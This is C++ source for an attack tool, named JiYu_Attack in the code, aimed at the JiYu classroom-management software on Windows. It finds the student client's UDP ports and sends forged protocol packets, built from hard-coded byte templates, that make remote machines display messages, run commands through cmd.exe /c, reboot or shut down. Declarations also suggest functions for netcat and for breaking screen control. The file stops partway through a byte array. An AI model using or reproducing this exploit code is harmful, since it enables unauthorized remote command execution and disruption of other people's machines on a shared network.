#ifdef _WIN32

#include <winsock2.h>
#include <ctime>
#include <cstdio>
#include <string>
#include <cstring>
#include <vector>
#include <regex>
#include <algorithm>
#include <conio.h>
#include <iostream>

#ifdef _MSC_VER
#pragma comment(lib,"ws2_32.lib")
#pragma warning(disable:4530)
#endif // _MSC_VER

class Logger {
    public:
        Logger(FILE* fp);
        ~Logger();
        enum LogLevel {
            DEBUG = 1,
            INFO,
            WARNING,
            IERROR,
            CRITICAL,
            NONE
        };
        static std::string getTime();
        void setLevel(int level);
        int getLevel();
        template<typename... Args>
        void log(int level, std::string content, Args... args);

    private:
        FILE* fp;
        int curLevel = WARNING;
};

std::string execCmd(std::string cmd, Logger* logger);

int strToInt(std::string str);

struct ParamOpt {
    std::string id = "";
    char opt = 0;
    std::string longopt = "";
    bool withParam = false;
    std::string defaultvalue = "";
};

struct ParamRet {
    std::string id = "";
    bool exists = false;
    std::string value = "";
};

std::vector<ParamRet> GetParams(int argc, char *argv[], std::vector<ParamOpt> opts);
ParamRet GetParamfromParams(std::string id, std::vector<ParamRet> rets);

class ISocket {
    public:
        ISocket(Logger* logger);
        ~ISocket();
        std::string localIP = "";
        std::vector<std::string> getLocalIPs();
        std::vector<int> getStudentPorts(std::string IP = "");
        int send(std::string IP, int port, std::vector<BYTE> data);
    private:
        WSADATA wsd;
        int optval = 1;
        SOCKET client;
        Logger* logger;
};

class JiYu_Attack {
    public:
        JiYu_Attack();
        static const std::vector<BYTE> cmdCodePrefix[4];
        static const int cmdContentBegin[2];
        enum cmdType {
            MSG = 0,
            CMD,
            REBOOT,
            SHUTDOWN
        };
        static const std::string nc_ps_url;
        ISocket* client;
        std::vector<std::string> IPParser(std::string rawIP);
        int sendCmd(std::string rawIP, int port, std::string cmd);
        int sendMsg(std::string rawIP, int port, std::string msg);
        int sendShutdown(std::string rawIP, int port);
        int sendReboot(std::string rawIP, int port);
        int netcat(std::string IP, int port, int ncport);
        int breakScreenControl();
        int continueScreenControl();
    
    private:
        Logger* logger;
};

DWORD WINAPI netcat_remote(LPVOID lpParameter);

Logger::Logger(FILE* fp) : fp(fp) {};

Logger::~Logger() {
    fclose(fp);
}

std::string Logger::getTime() {
	time_t rawtime;
	time(&rawtime);
	char tmstr[9];
	strftime(tmstr, 9, "%H:%M:%S", localtime(&rawtime));
	return (std::string)tmstr;
}

int Logger::getLevel() {
    return curLevel;
}

void Logger::setLevel(int level) {
    curLevel = level;
}

template<typename... Args>
void Logger::log(int level, std::string content, Args... args) {
    if(level < curLevel) return;
    std::string levelStr;
    if(level == DEBUG) levelStr = "DEBUG";
    else if(level == INFO) levelStr = "INFO";
    else if(level == WARNING) levelStr = "WARNING";
    else if(level == IERROR) levelStr = "ERROR";
    else if(level == CRITICAL) levelStr = "CRITICAL";
    fprintf(fp, ("[" + getTime() + "|" + levelStr + "] " + content + "\n").c_str(), args...);
}

#define popen _popen
#define pclose _pclose

std::string execCmd(std::string cmd, Logger* logger) {
    char buf_ps[1024] = {};
    char ps[1024] = {0};
    char result[2048] = {};
    auto ptr = new FILE;
    strcpy(ps, cmd.c_str());
    if((ptr = popen(ps, "r")) != NULL) {
        while(fgets(buf_ps, 1024, ptr) != NULL) {
            strcat(result, buf_ps);
            if(strlen(result) > 1024) break;
        }
        pclose(ptr);
        ptr = NULL;
        return result;
    }
    else {
        logger->log(Logger::IERROR, "Failed to popen %s", ps);
        return "";
    }
}

int strToInt(std::string str) {
    int ret = 0;
    for(auto i: str) {
        ret = ret * 10 + i - '0';
    }
    return ret;
}

std::vector<ParamRet> GetParams(int argc, char *argv[], std::vector<ParamOpt> opts) {
    std::vector<ParamRet> rets;
    for(auto opt: opts) {
        ParamRet ret;
        ret.id = opt.id;
        for(int i = 1; i < argc; i++) {
            if(argv[i][0] == '-') {
                if(
                    (opt.longopt != "" && argv[i][1] == '-' && argv[i] == "--" + opt.longopt) ||
                    (argv[i][1] == opt.opt && argv[i][2] == '\0')
                ) {
                    ret.exists = true;
                    if(opt.withParam && i < argc - 1) {
                        i++;
                        if(argv[i][0] != '-') {
                            ret.value = argv[i];
                        }
                        else ret.value = opt.defaultvalue;
                    }
                    else ret.value = opt.defaultvalue;
                    break;
                }
            }
        }
        if(!ret.exists && opt.withParam && opt.defaultvalue != "") ret.value = opt.defaultvalue;
        rets.push_back(ret);
    }
    return rets;
}

ParamRet GetParamfromParams(std::string id, std::vector<ParamRet> rets) {
    for(auto ret: rets) {
        if(ret.id == id) {
            return ret;
        }
    }
    return ParamRet();
}

ISocket::ISocket(Logger* logger): logger(logger) {
    if(WSAStartup(MAKEWORD(2, 2), &wsd) != 0) {
        logger->log(Logger::IERROR, "执行 WSAStartup 失败。");
        return;
    }

    client = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(client <= 0) {
        logger->log(Logger::IERROR, "Socket 客户端启动失败。");
        return;
    }
    setsockopt(client, SOL_SOCKET, SO_REUSEADDR, (const char*)&optval, sizeof(int));

    std::vector<std::string> localIPs = getLocalIPs();
    for(auto IP: localIPs) {
        if(getStudentPorts(IP).size()) {
            localIP = IP;
            break;
        }
    }
    if(localIP == "" && localIPs.size()) localIP = localIPs[0];
}

ISocket::~ISocket() {
    WSACleanup();
}

std::vector<std::string> ISocket::getLocalIPs() {
    char host[100] ={0};
    std::vector<std::string> ret;

    if(gethostname(host, sizeof(host)) == SOCKET_ERROR) {
        logger->log(Logger::IERROR, "执行 gethostname 失败。");
        return ret;
    }

    struct hostent *hp;
    if((hp = gethostbyname(host)) == NULL) {
        logger->log(Logger::IERROR, "执行 gethostbyname 失败。");
        return ret;
    }

    for(int i = 0; hp -> h_addr_list[i] != NULL; i++) {
        ret.push_back(inet_ntoa(*(struct in_addr*)hp->h_addr_list[i]));
    }
    return ret;
}

std::vector<int> ISocket::getStudentPorts(std::string IP) {
    if(IP == "") IP = localIP;
    std::vector<int> ret;

    std::string taskStudent = execCmd("tasklist | findstr \"Student\"", logger);
    std::regex pattern("[e]\\s*\\d{1,5}\\s*[C]");
    std::smatch matches;
    if(!std::regex_search(taskStudent, matches, pattern)){
        logger->log(Logger::WARNING, "进程 StudentMain.exe 未找到。返回空结果。");
        return ret;
    }
    std::string studentPID = matches[0];
    studentPID = studentPID.substr(1, studentPID.size() - 2);
    while(!isprint(studentPID.front())) studentPID.erase(studentPID.begin());
    while(!isprint(studentPID.back())) studentPID.pop_back();

    std::string netstat = execCmd("netstat -ano | findstr \"" + studentPID + "\"", logger);
    pattern = std::regex(IP + ":\\d{1,5}\\s*[*]");
    while(std::regex_search(netstat, matches, pattern)) {
        std::string portStr = matches[0];
        portStr = portStr.substr(IP.size() + 1, portStr.size() - IP.size() - 2);
        while(!isprint(portStr.back())) portStr.pop_back();
        int port = strToInt(portStr);
        ret.push_back(port);
        netstat = matches.suffix().str();
    }
    return ret;
}

int ISocket::send(std::string IP, int port, std::vector<BYTE> data) {
    data[12] = rand() % 256;

    SOCKADDR_IN dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(port);
    dest_addr.sin_addr.S_un.S_addr = inet_addr(IP.c_str());

    int sendRes;
    sendRes = sendto(client, (const char*)&data[0], data.size() * sizeof(BYTE), 0, (sockaddr*)&dest_addr, sizeof(sockaddr));
    if(sendRes == -1) {
        logger->log(Logger::IERROR, "发送失败。函数 sendto 出现问题。");
        return 1;
    }
    return 0;
}

JiYu_Attack::JiYu_Attack() {
    logger = new Logger(stdout);
    logger->setLevel(Logger::IERROR);
    client = new ISocket(logger);
}

const std::vector<BYTE> JiYu_Attack::cmdCodePrefix[4] = {
    std::vector<BYTE>{
        0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x9e, 0x03, 0x00, 0x00, 0x10, 0x41, 0xaf, 0xfb, 0xa0, 0xe7, 0x52, 0x40, 0x91, 0xdc, 0x27, 0xa3, 0xb6, 0xf9, 0x29, 0x2e, 0x20, 0x4e, 0x00, 0x00,
        0xc0, 0xa8, 0x50, 0x81, 0x91, 0x03, 0x00, 0x00, 0x91, 0x03, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    }, std::vector<BYTE>{
        0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x6e, 0x03, 0x00, 0x00, 0x5b, 0x68, 0x2b, 0x25, 0x6f, 0x61, 0x64, 0x4d, 0xa7, 0x92, 0xf0, 0x47, 0x00, 0xc5, 0xa4, 0x0e, 0x20, 0x4e, 0x00, 0x00,
        0xc0, 0xa8, 0x64, 0x86, 0x61, 0x03, 0x00, 0x00, 0x61, 0x03, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x43, 0x00, 0x3a, 0x00,
        0x5c, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x64, 0x00, 0x6f, 0x00, 0x77, 0x00, 0x73, 0x00, 0x5c, 0x00, 0x73, 0x00, 0x79, 0x00, 0x73, 0x00, 0x74, 0x00, 0x65, 0x00, 0x6d, 0x00, 0x33, 0x00,
        0x32, 0x00, 0x5c, 0x00, 0x63, 0x00, 0x6d, 0x00, 0x64, 0x00, 0x2e, 0x00, 0x65, 0x00, 0x78, 0x00, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2f, 0x00, 0x63, 0x00,
        0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
        0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    }, std::vector<BYTE>{
        0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x2a, 0x02, 0x00, 0x00, 0xbf, 0x40, 0x22, 0x4e, 0x57, 0x2d, 0x3e, 0x4f, 0x9b, 0x6f, 0xc1, 0x8d, 0xe1, 0xeb, 0x4f, 0x62, 0x20, 0x4e, 0x00, 0x00,
        0xc0, 0xa8, 0x50, 0x81, 0x1d, 0x02, 0x00, 0x00, 0x1d, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x13, 0x00, 0x00, 0x10, 0x0f, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x59, 0x65, 0x08, 0x5e, 0x06, 0x5c, 0xcd, 0x91, 0x2f, 0x54, 0xa8, 0x60, 0x84, 0x76, 0xa1, 0x8b, 0x97, 0x7b, 0x3a, 0x67, 0x02, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
